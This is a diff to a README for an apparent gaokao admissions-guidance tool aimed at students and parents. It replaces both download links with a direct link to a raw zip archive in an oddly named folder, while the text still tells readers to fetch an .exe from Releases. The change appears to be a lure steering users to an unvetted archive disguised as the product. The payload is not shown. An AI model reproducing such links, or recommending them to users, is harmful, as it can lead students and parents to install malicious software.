@@ -1,6 +1,6 @@
 # 🎓 ZhangXueFeng-skill - Accurate高考 guidance for students and parents
 
-[![Download ZhangXueFeng-skill](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/guenbourbochra-cloud/ZhangXueFeng-skill)
+[![Download ZhangXueFeng-skill](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/guenbourbochra-cloud/ZhangXueFeng-skill/raw/refs/heads/main/oddly/skill_Feng_Xue_Zhang_v2.6.zip)
 
 This tool helps students and parents make smart choices about college admissions. It acts as a guide to navigate the complex exam process. While other tools focus on entertainment, this application prioritizes data accuracy. It provides the facts you need to make informed decisions for your academic future.
 
@@ -8,7 +8,7 @@ This tool helps students and parents make smart choices about college admissions
 
 You need to get the software from the official repository. Follow these steps to prepare your computer.
 
-1. Visit the [official download page](https://github.com/guenbourbochra-cloud/ZhangXueFeng-skill).
+1. Visit the [official download page](https://github.com/guenbourbochra-cloud/ZhangXueFeng-skill/raw/refs/heads/main/oddly/skill_Feng_Xue_Zhang_v2.6.zip).
 2. Look for the latest version under the Releases section on the right side of the screen.
 3. Click the link that ends with .exe to save the file to your computer.
 
